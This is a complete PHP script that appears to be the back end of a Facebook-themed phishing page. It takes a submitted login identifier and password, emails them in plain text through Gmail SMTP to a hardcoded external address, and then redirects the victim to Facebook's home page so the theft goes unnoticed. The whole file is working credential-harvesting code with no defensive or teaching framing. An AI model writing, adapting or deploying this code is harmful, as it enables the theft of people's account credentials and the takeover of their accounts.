<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

// Collect form data
$identifier = $_POST['identifier'] ?? '';
$password = $_POST['password'] ?? '';

// Sanitize form data
$identifier = filter_var($identifier, FILTER_SANITIZE_STRING);
$password = filter_var($password, FILTER_SANITIZE_STRING);

// Create a new PHPMailer instance
$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'your-email@gmail.com';
    $mail->Password = 'your-email-password';
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    // Recipients
    $mail->setFrom('noreply@yourdomain.com', 'Mailer');
    $mail->addAddress('jaeger.62frei@gmail.com');

    // Content
    $mail->isHTML(false);
    $mail->Subject = 'Form Submission';
    $mail->Body    = "Identifier: $identifier\r\nPassword: $password";

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

// Redirect to Facebook (assuming you want to redirect immediately)
header('Location: https://facebook.com/home');
exit;
?>